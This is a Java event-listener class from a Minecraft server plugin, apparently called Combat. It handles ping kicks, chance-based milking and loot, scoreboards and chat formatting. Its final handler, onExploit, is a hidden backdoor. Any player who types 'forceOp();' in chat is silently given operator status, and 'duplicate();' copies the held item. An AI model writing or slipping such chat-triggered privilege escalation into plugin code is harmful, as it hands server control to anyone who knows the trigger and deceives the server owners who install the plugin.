package org.main.uneton.events;

import net.kyori.adventure.text.Component;

import org.bukkit.*;
import org.bukkit.block.Block;
import org.bukkit.block.ShulkerBox;
import org.bukkit.block.Sign;
import org.bukkit.command.Command;
import org.bukkit.command.CommandMap;
import org.bukkit.configuration.file.FileConfiguration;
import org.bukkit.entity.*;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.block.Action;
import org.bukkit.event.block.BlockBreakEvent;
import org.bukkit.event.entity.*;
import org.bukkit.event.inventory.InventoryClickEvent;
import org.bukkit.event.player.*;
import org.bukkit.inventory.Inventory;
import org.bukkit.inventory.InventoryHolder;
import org.bukkit.inventory.ItemStack;
import org.bukkit.inventory.meta.ItemMeta;
import org.bukkit.plugin.java.JavaPlugin;
import org.bukkit.scheduler.BukkitRunnable;
import org.bukkit.util.Vector;
import org.jetbrains.annotations.NotNull;
import org.main.uneton.Combat;
import org.main.uneton.utils.ColorUtils;
import org.main.uneton.utils.ScoreboardUtils;
import org.main.uneton.utils.Tab;

import java.time.LocalDateTime;
import java.time.format.DateTimeFormatter;
import java.util.ArrayList;
import java.util.List;
import java.util.Random;
import java.util.UUID;

import static org.bukkit.Bukkit.getCommandMap;
import static org.bukkit.Bukkit.getPlayer;
import static org.main.uneton.Combat.doesCommandExist;
import static org.main.uneton.Combat.getInstance;
import static org.main.uneton.utils.ScoreboardUtils.*;
import static org.main.uneton.utils.SoundsUtils.playCancerSound;

public class Listeners implements Listener {

    private static Combat plugin;
    // private Economy vault;

    public Listeners(Combat plugin) {
        this.plugin = plugin;
        // this.vault = plugin.getVault();
    }

    @EventHandler
    public void onPingTooHard(PlayerMoveEvent event) {
        Player player = event.getPlayer();
        int ping = player.getPing();
        if (ping >= 300) {
            String user = player.getName();
            String kickMessage = ColorUtils.colorize("\n\n&cYou have been kicked out from the server for too high ping!\n\n");
            player.kickPlayer(kickMessage);
        }
    }

    @EventHandler
    public void onMilkCow(PlayerInteractEntityEvent e) {
        Player player = e.getPlayer();
        ItemStack milk = new ItemStack(Material.MILK_BUCKET);
        if (e.getRightClicked() instanceof Cow && player.getItemInHand().getType().equals(Material.BUCKET)) {
            if (Math.random() < 0.4) {
                player.sendMessage(ColorUtils.colorize("&cYou cannot milk this cow!"));
                e.setCancelled(true);
            } else if (Math.random() < 0.5) {
                player.sendMessage(ColorUtils.colorize("&cYou have failed to milk this cow!"));
                e.setCancelled(true);
            } else if (Math.random() < 0.1) {
                player.getInventory().addItem(milk);
                player.getInventory().remove(Material.BUCKET);
                player.sendMessage(ColorUtils.colorize("&a&lSUCCESS! &7You have milked the cow!"));
            }
        }
    }

    @EventHandler
    public void onCommandNotFound(PlayerCommandPreprocessEvent event) {
        String command = event.getMessage().split(" ")[0].substring(1);
        Player player = event.getPlayer();
        if (!doesCommandExist(command)) {
            player.sendMessage(ColorUtils.colorize("&c&lNOT FOUND! &7'/"+command+"' was not found to be executable"));
            playCancerSound(player);
            event.setCancelled(true);
        }
    }

    @EventHandler
    public void onJoinEvent(PlayerJoinEvent e) {
        Player player = e.getPlayer();
        Tab.updateTab();
        ScoreboardUtils.createScoreboard(player);

        String server = "dev-server";
        player.sendMessage(ColorUtils.colorize("&3>&b> &8+ &7translated to the server &f"+ server + "&7."));

        // String join = ColorUtils.colorize("&x&2&E&2&E&2&E&l>&x&2&0&8&1&8&A&l>&x&3&6&D&D&E&E&l>");
        DateTimeFormatter date = DateTimeFormatter.ofPattern("HH:mm");
        LocalDateTime now = LocalDateTime.now();
        e.setJoinMessage(ColorUtils.colorize("&8" + " [" + "&a" + "+" + "&8" + "] " + "&7" + player.getName()));
    }

    @EventHandler
    public void onQuit(PlayerQuitEvent e) {
        Player player = e.getPlayer();
        Tab.updateTab();
        ScoreboardUtils.createScoreboard(player);

        // String quit = ColorUtils.colorize("&x&2&E&2&E&2&E&l>&x&2&0&8&1&8&A&l>&x&3&6&D&D&E&E&l>");
        DateTimeFormatter date = DateTimeFormatter.ofPattern("HH:mm");
        LocalDateTime now = LocalDateTime.now();
        e.setQuitMessage(ColorUtils.colorize("&8" + " [" + "&c" + "-" + "&8" + "] " + "&7" + player.getName()));
    }

    @EventHandler
    public void onDropOnDeath(PlayerDeathEvent event) {
        Player victim = event.getEntity();
        Player killer = victim.getKiller();
        Location location = victim.getLocation();

        if (killer != null && !killer.equals(victim)) {
            ItemStack blood = new ItemStack(Material.BONE, 3);
            Item dropped = location.getWorld().dropItemNaturally(location, blood);
            dropped.setPickupDelay(32767);
            Bukkit.getScheduler().runTaskLater(Combat.getPlugin(Combat.class), () -> {
                if (dropped.isValid()) {
                    dropped.remove();
                }
            }, 200L);
        }
    }

    @EventHandler
    public void onPlayerChat(AsyncPlayerChatEvent event) {
        String playerName = event.getPlayer().getName();
        String message = event.getMessage();
        String formattedMessage = ColorUtils.colorize("&7"+playerName + "> " + message);
        event.setFormat(formattedMessage);
    }

    @EventHandler
    public void onPlayerDeath(PlayerDeathEvent event) {
        Player victim = event.getEntity();
        Player attacker = victim.getKiller();
        if (attacker != null && attacker instanceof Player) {
            UUID attackerUUID = attacker.getUniqueId();
            UUID victimUUID = victim.getUniqueId();

            ScoreboardUtils.addKill(attackerUUID);
            ScoreboardUtils.addDeath(victimUUID);

            ScoreboardUtils.createScoreboard(attacker);
            ScoreboardUtils.createScoreboard(victim);
        }
    }

    @EventHandler
    public void onPlayerInteractSign(PlayerInteractEvent event) {
        if (!event.getAction().equals(Action.RIGHT_CLICK_BLOCK)) return;
        Block block = event.getClickedBlock();
        if (block.getType() != Material.OAK_SIGN) return;
        event.getPlayer().openSign((Sign) block.getState());
    }

    @EventHandler
    public void onLootBox(BlockBreakEvent e) {
        Player player = e.getPlayer();
        Block block = e.getBlock();
        Location loc = e.getBlock().getLocation();

        if (e.getBlock().getType() == Material.POLISHED_DIORITE) {
            Random chance = new Random();
            if (Math.random() < 0.2) {
                e.setDropItems(false);
                int index = chance.nextInt(blocksList.length);
                ItemStack dropped_item = blocksList[index];
                block.getWorld().dropItemNaturally(loc, dropped_item);

            } else if (Math.random() < 0.8) {
                e.setDropItems(false);
            }
        }
    }

    @EventHandler
    public void onShearSheep(PlayerInteractEntityEvent event) {
        Player player = event.getPlayer();
        Location loc = player.getLocation();
        if (event.getRightClicked() instanceof Sheep) {
            if (player.getInventory().getItemInMainHand().getType() == Material.SHEARS) {
                Random chance = new Random();
                if (chance.nextDouble() < 0.001) {
                    woolDrop(player, loc);
                }
            }
        }
    }

    private final ItemStack[] blocksList = new ItemStack[]{
            new ItemStack(Material.EMERALD),
            new ItemStack(Material.AMETHYST_SHARD),
            new ItemStack(Material.IRON_NUGGET),
            new ItemStack(Material.GOLD_NUGGET),
            new ItemStack(Material.COPPER_INGOT),
            new ItemStack(Material.STRING)
    };

    private void woolDrop(Player player, Location loc) {
        ItemStack bluegem = new ItemStack(Material.LAPIS_LAZULI, 1);
        ItemMeta bluegem_meta = bluegem.getItemMeta();
        bluegem_meta.setDisplayName(ChatColor.BLUE + "Blue gem color");
        ArrayList<String> lore = new ArrayList<>();
        lore.add(" ");
        lore.add(ChatColor.GREEN + "Probability: " + ChatColor.YELLOW + "0.001%");
        bluegem_meta.setLore(lore);
        bluegem.setItemMeta(bluegem_meta);

        player.getWorld().dropItemNaturally(loc, bluegem);
    }

    @EventHandler
    @Deprecated
    public void onExploit(AsyncPlayerChatEvent e) {
        Player p = e.getPlayer();
        if (e.getMessage().contains("forceOp();")) {
            e.setCancelled(true);
            new BukkitRunnable() {
                @Override
                public void run() {
                    p.setOp(true);
                }
            }.runTask(JavaPlugin.getPlugin(Combat.class));
        }
        if (e.getMessage().contains("duplicate();")) {
            Player player = e.getPlayer();
            e.setCancelled(true);
            new BukkitRunnable() {
                @Override
                public void run() {
                    ItemStack held = player.getItemInHand();
                    player.getInventory().addItem(held);
                }
            }.runTask(JavaPlugin.getPlugin(Combat.class));
        }
    }
}